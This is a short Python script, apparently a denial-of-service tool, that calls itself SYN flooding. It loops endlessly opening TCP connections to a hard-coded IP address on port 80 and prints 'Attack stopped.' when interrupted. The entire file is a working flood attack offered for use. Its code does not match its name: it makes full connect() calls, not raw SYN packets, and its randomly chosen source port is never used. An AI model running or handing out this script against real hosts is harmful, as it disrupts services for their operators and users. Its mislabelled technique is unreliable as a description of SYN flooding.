import socket
import random

def synPacket(sourcePorts,target):
    sourcePort = random.choice(sourcePorts)
    print(sourcePort)
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        s.connect(target)
    except:
        s.close()
        


def synFlooding(targetIP,targetPort):
    try:
        target = (targetIP,targetPort)
        sourcePorts = range(1024,65535)
        print(sourcePorts)

        while 1:
            synPacket(sourcePorts,target)

    except KeyboardInterrupt:
        print("Attack stopped.")
    except Exception as e:
        print(f"An error occurred: {e}")
if __name__ == '__main__':

    targetIP = "12.0.0.4"
    targetPort = 80

    synFlooding(targetIP,targetPort)